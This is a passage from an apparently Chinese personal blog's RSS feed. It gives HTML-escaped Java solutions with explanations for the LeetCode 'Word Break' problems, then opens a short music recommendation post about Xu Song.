class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;wordDict&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;        &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Set&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;String&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;wordSet&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;new&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;HashSet&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;wordDict&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;        &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;HashMap&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Integer&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Boolean&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;memo&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;new&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;HashMap&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;        &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;canBreak&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;wordSet&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;memo&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;时间复杂度：O(n^2*m) 其中n是字符串s的长度，m是字典中最长单词的长度&lt;/p&gt;
&lt;p&gt;空间复杂度：O(n)&lt;/p&gt;
&lt;h3 id=&#34;单词拆分ii&#34;&gt;单词拆分II&lt;/h3&gt;
&lt;p&gt;&lt;a href=&#34;https://leetcode.cn/problems/word-break-ii/description/&#34;&gt;题目链接&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://xuoneyuan.github.io/images/wordbreak2.png&#34; alt=&#34;wordbreak1.png&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;dfs回溯&#34;&gt;DFS+回溯&lt;/h4&gt;
&lt;p&gt;II相比于I，不仅要判断解是否存在，还要列出所有可能的解&lt;/p&gt;
&lt;h5 id=&#34;分析&#34;&gt;分析&lt;/h5&gt;
&lt;p&gt;递归的基条件是检查起始位置start是否已经到达字符串s的末尾。如果是，就将当前路径添加到结果列表中。在每次递归中，遍历单词字典，尝试将每个单词作为当前位置的前缀。如果成功，将该单词添加到当前路径中，并递归地调用dfs处理剩下的字符串。在每次递归调用dfs后，需要从当前路径中移除最后添加的单词，这确保了当前路径始终反映了到当前递归深度为止的所有有效选择，每当找到一个有效的单词组合时，就将其以字符串形式添加到结果列表中。&lt;/p&gt;
&lt;h5 id=&#34;代码-2&#34;&gt;代码&lt;/h5&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kd&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;nc&#34;&gt;Solution&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;kd&#34;&gt;public&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;List&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;String&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;wordBreak&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;String&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;List&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;String&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;wordDict&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;        &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;List&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;String&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;results&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;new&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ArrayList&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;        &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;dfs&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;wordDict&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;new&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ArrayList&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(),&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;results&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;        &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;results&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;kd&#34;&gt;private&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;void&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;dfs&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;String&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;List&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;String&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;wordDict&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;start&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;List&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;String&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;current&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;List&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;String&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;results&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;        &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;start&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;==&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;length&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;())&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;            &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;results&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;add&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;String&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;join&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34; &amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;current&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;));&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;            &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;        &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;        &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;for&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;String&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;word&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;wordDict&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;            &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;start&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;word&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;length&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;length&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;substring&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;start&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;start&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;word&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;length&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()).&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;equals&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;word&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;                &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;current&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;add&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;word&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;                &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;dfs&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;wordDict&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;start&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;word&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;length&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(),&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;current&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;results&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;                &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;current&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;remove&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;current&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;size&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;// 回溯&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;            &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;        &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;</description>
                
                
                
                
                
                    
                        
                            
                                
                                
                                
                                    <category domain="https://xuoneyuan.github.io/categories/%E7%AE%97%E6%B3%95/">算法</category>
                                
                            
                        
                    
                        
                            
                                
                                
                                
                                    <category domain="https://xuoneyuan.github.io/tags/%E7%AE%97%E6%B3%95/">算法</category>
                                
                            
                                
                                
                                
                                    <category domain="https://xuoneyuan.github.io/tags/leetcode/">leetcode</category>
                                
                            
                        
                    
                
            </item>
        
            <item>
                <title>欲买桂花同载酒</title>
                <link>https://xuoneyuan.github.io/posts/8/</link>
                <guid isPermaLink="true">https://xuoneyuan.github.io/posts/8/</guid>
                <pubDate>Wed, 29 Nov 2023 17:12:10 &#43;0800</pubDate>
                
                    <author>xuoneyuan@gmail.com (falcone)</author>
                
                <copyright>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)</copyright>
                
                    <description>&lt;p&gt;今天推荐一位大家耳熟能详的歌手，许嵩&lt;/p&gt;
&lt;p&gt;非主流年代的音乐三巨头之一，也是我认为三人中最有才气的一位&lt;/p&gt;
&lt;p&gt;视频来自于B站宝藏up主——音乐收藏馆&lt;/p&gt;
